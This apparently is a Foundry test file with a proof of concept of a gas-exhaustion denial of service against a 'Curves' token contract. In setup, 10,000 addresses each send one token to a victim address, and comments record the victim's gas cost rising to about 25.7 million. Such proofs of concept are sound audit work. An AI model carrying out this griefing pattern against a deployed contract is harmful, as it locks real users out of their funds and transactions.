// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.7;

import {Test, console} from "forge-std/Test.sol";

import {CurvesERC20Factory} from "../../contracts/CurvesERC20Factory.sol";
import {FeeSplitter} from "../../contracts/FeeSplitter.sol";
import {Curves, CurvesErrors} from "../../contracts/Curves.sol";
import {CurvesERC20} from "../../contracts/CurvesERC20.sol";

contract CurvesTest is Test {
    CurvesERC20Factory curveERC20Factory;
    FeeSplitter feeSplitter;
    Curves curves;

    address owner = makeAddr("owner");
    address feeReceiverOwner = makeAddr("feeReceiverOwner");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");
    address hacker = makeAddr("hacker");
    address victim = makeAddr("victim");

    uint256 constant FRIEND_TECH_INITIAL_PRICE = 62_500_000_000_000;

    function setUp() public {
        vm.deal(owner, 99 ether);

        vm.startPrank(owner);
        curveERC20Factory = new CurvesERC20Factory();
        feeSplitter = new FeeSplitter();
        curves = new Curves(address(curveERC20Factory), address(feeSplitter));
        feeSplitter.setCurves((curves));
        feeSplitter.setManager(address(curves), true);
        vm.stopPrank();

        for (uint256 i = 0; i < 10000; i++) {
            address user = makeAddr(string(abi.encode(i)));
            vm.startPrank(user);
            curves.buyCurvesToken(user, 1);
            // assertEq(curves.curvesTokenBalance(user, user), 1);
            curves.transferCurvesToken(user, victim, 1);
            vm.stopPrank();
        }
    }

    function test_dosPoc() public {
        vm.startPrank(victim);
        curves.buyCurvesToken(victim, 1);

        // address arr = (curves.ownedCurvesTokenSubjects(victim, 0));
        // console.log(arr)
        //125018
        //110483    - 1
        //133568    - 10
        //364418    - 100
        //2672918   - 1000
        //25757918  - 10000
        
        //125021    - 1000
        //125021    - 10000
    } 

    function test_notVictim() public {
        vm.startPrank(alice);
        curves.buyCurvesToken(alice, 1);
    }
}
